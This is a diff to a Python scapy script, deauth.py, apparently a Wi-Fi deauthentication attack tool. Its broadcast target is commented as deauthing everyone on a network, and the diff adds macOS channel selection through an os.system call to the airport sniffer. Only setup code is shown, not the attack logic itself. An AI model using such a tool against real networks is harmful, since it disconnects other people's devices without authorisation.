@@ -1,18 +1,27 @@
+# To make this file compatible with linux comment out the channel selection code
+
 from scapy.all import *
 from datetime import datetime
 import sys
 import time
 import subprocess
+import os
 
 client = "FF:FF:FF:FF:FF:FF" # Use FF:FF:FF:FF:FF:FF to deauth everyone on that network. Use a specific mac address to only deauth a certain device
+found = {}
 
 if len(sys.argv) < 2:
   print("usage: deauth.py <iface>")
   sys.exit(-1)
 conf.iface = sys.argv[1]
 
-# Sniffer Code:
-found = {}
+# WARNING: The following channel selection code only works on mac. Remove to make the code linux compatible.
+# Select channel
+channel = ""
+while channel.isdigit() != True:
+  channel = input("Channel to use: ")
+os.system("nohup /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + conf.iface + " sniff " + channel + " &")
+time.sleep(0.5)
 
 # Function to process captured packets
 def sniffmgmt(p):
